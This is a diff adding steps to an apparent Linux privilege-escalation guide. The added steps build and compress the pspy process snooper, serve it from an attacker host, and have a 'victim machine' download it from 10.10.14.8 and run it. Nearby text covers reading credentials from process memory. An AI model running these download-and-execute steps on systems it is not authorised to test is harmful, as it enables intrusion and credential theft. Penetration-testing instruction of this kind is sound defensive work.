@@ -129,6 +129,23 @@ rpm -qa | grep program_name #Redhat
 
 We can use [pspy ](https://github.com/DominicBreuker/pspy)to dynamically monitor the processes are running in the system. Pspy is designed to snoop on processes without the need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. 
 
+```bash
+git clone https://github.com/DominicBreuker/pspy
+cd pspy
+go build -ldflags "-s -w" main.go
+upx main
+mv main pspy
+python3 -m http.server 80
+```
+
+On the victim machine, download pspy and execute it:
+
+```text
+wget http://10.10.14.8/pspy
+chmod +x pspy
+./pspy
+```
+
 ### Process Memory
 
 Some services store credentials in plaintext in memory. Since the standard behavior is that low privileged users cannot read data from other users, this technique is most likely to be used when you're a root user but when your current user owns the process that contains the sensitive information then you can read since your user owns it.
